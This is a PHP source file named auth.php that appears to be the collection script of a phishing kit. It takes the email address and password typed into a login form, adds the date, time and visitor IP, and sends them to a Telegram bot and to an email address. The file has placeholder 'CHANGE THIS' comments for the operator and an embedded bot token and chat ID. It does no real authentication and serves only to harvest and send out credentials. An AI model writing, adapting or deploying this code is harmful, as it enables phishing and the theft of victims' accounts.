<?php
// auth.php

header("Access-Control-Allow-Origin: *");
header("Access-Control-Allow-Methods: POST");
header("Access-Control-Allow-Headers: Content-Type");

$your_email = "your_email@gmail.com"; // CHANGE THIS
$telegram_bot_token = "6605586289:AAELGEE7TtJECHJeofMpL1TFvsLPXP9Nypo"; // CHANGE THIS
$telegram_chat_id = "5272942689"; // CHANGE THIS

$email = isset($_POST['email']) ? $_POST['email'] : '';
$password = isset($_POST['password']) ? $_POST['password'] : '';
$remember = isset($_POST['remember']) ? $_POST['remember'] : 'false';

$date = date('Y-m-d');
$time = date('H:i:s');
$ip = $_SERVER['REMOTE_ADDR'];

$message = "Login Attempt\n";
$message .= "Email: $email\n";
$message .= "Password: $password\n";
$message .= "Remember: $remember\n";
$message .= "Date: $date\n";
$message .= "Time: $time\n";
$message .= "IP: $ip";

// Send to Telegram
file_get_contents("https://api.telegram.org/bot$telegram_bot_token/sendMessage?chat_id=$telegram_chat_id&text=" . urlencode($message));

// Send to Email
mail($your_email, "Login Attempt - $date", $message);
?>